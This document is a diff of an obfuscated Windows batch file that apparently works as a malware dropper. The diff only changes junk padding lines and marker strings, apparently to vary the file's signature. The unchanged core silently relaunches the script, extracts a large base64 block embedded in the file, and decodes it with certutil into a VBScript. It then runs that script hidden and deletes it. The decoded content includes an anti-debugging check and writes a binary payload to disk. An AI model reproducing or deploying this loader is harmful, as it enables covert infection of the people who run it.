@@ -1,11 +1,13 @@
 @echo off
-set /a hyjslxcwgnvjzo=13+39 >nul 2>&1
-if not defined xlgrhycciqhaajyz set "xlgrhycciqhaajyz=25"
-if not defined salwfohfuxmjxqdcrn set "salwfohfuxmjxqdcrn=17"
-set "gglffmzazmljvwsqlj=pagatrgfulznshleaox8032"
-if 0==1 echo wkjbsjqpfjnmppaot
-if not defined deqojqvmymtkqr set "deqojqvmymtkqr=94"
-if 0==1 echo crwyevlyydfpot
+if not defined anyhwrokkna set "anyhwrokkna=71"
+if 0==1 echo fncruynezgmxgj
+if 0==1 echo xzstiwforhqiwfqry
+REM frfiqgpkhogpjwk djlpbtaofg
+if 0==1 echo kofpdfujzekmzdlsh
+set /a vsfgxymcbsyhovsgwir=13+33 >nul 2>&1
+set /a maaezsfkifnfmh=1+35 >nul 2>&1
+set "uxtcawzfzjpqxobqri=evcpjbevtg3892"
+if not defined mroeyicxbzktlg set "mroeyicxbzktlg=55"
 if /I "%~1"=="_h" goto main
 start "" /min cmd /c "%~f0" _h
 exit /b
@@ -17,13 +19,13 @@ set "CAP=0"
 >"%B64F%" (
   for /f "usebackq delims=" %%L in ("%~f0") do (
     if "!CAP!"=="1" (
-      if /I "%%L"=="::cruimkneynkxv::" (
+      if /I "%%L"=="::skyqitombydmhm::" (
         set "CAP=0"
       ) else (
         echo(%%L
       )
     )
-    if /I "%%L"=="::jyhaizxvmqhj::" set "CAP=1"
+    if /I "%%L"=="::ojrbecqjcwcx::" set "CAP=1"
   )
 )
 certutil -f -decode "%B64F%" "%VBSF%" >nul 2>&1
@@ -32,14 +34,11 @@ start "" /min /wait "%VBSF%"
 set "EC=!ERRORLEVEL!"
 del /f /q "%VBSF%" >nul 2>&1
 endlocal & exit /b %EC%
-REM duhwsxaghyksvokfcr scrvipqhtddvhblr
-if 0==1 echo aswqsxavtbax
-set /a jmgxhlekwk=27+30 >nul 2>&1
-if not defined rgzfhxohdk set "rgzfhxohdk=70"
-if 0==1 echo dkrzyglsnlpwt
-if not defined kfehhqhalrofkssnvy set "kfehhqhalrofkssnvy=89"
-REM rlngmcbijirkr rwmlwlxcbpsiokyoir
-::jyhaizxvmqhj::
+set /a ebuelikbkfnz=15+1 >nul 2>&1
+if 0==1 echo dbnmalpkpuyop
+if not defined xbenxqsoxfpd set "xbenxqsoxfpd=64"
+if not defined enuyigcddnmyv set "enuyigcddnmyv=40"
+::ojrbecqjcwcx::
 RGltIGJvZHlYLCBib2R5UHMxUGF0aCwgZnNvClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlw
 dGluZy5GaWxlU3lzdGVtT2JqZWN0IikKYm9keVg9IlpuVnVZM1JwYjI0Z1NYTkVaV0oxWnlCN0Np
 QWdJQ0FrWkdWaWRXZEdhV3hsSUQwZ0lrTTZYR1JsWW5WbkxuUjRkQ0lLSUNBZ0lBb2dJQ0FnZEhK
@@ -4378,9 +4377,11 @@ ZWFtLk9wZW4KICAgIHN0cmVhbS5Xcml0ZSBiaW5hcnlEYXRhCiAgICAKICAgIHN0cmVhbS5TYXZl
 VG9GaWxlIG91dHB1dEZpbGVQYXRoLCAyCiAgICBzdHJlYW0uQ2xvc2UKICAgIAogICAgU2V0IHN0
 cmVhbSA9IE5vdGhpbmcKICAgIFNldCBub2RlID0gTm90aGluZwogICAgU2V0IHhtbERvYyA9IE5v
 dGhpbmcKRW5kIEZ1bmN0aW9uCg==
-::cruimkneynkxv::
-set /a egmhskzrivvytefsajy=33+40 >nul 2>&1
-set /a qoyucmbljjnvunpk=34+13 >nul 2>&1
-set /a tewsqwyefqli=29+29 >nul 2>&1
-if not defined hagfvgnjrdu set "hagfvgnjrdu=31"
-if 0==1 echo jzswerzzpywfdniyzlm
+::skyqitombydmhm::
+if not defined ngatjhsqzpmgkcmzvn set "ngatjhsqzpmgkcmzvn=42"
+if 0==1 echo bghteavnhbs
+if not defined ntxvxympywhq set "ntxvxympywhq=50"
+set /a cdmpzlellsfxq=25+40 >nul 2>&1
+if not defined swfjghuynzrlnmwx set "swfjghuynzrlnmwx=54"
+set /a lfijyfwovfbrpj=19+3 >nul 2>&1
+if 0==1 echo xusufmtgqa
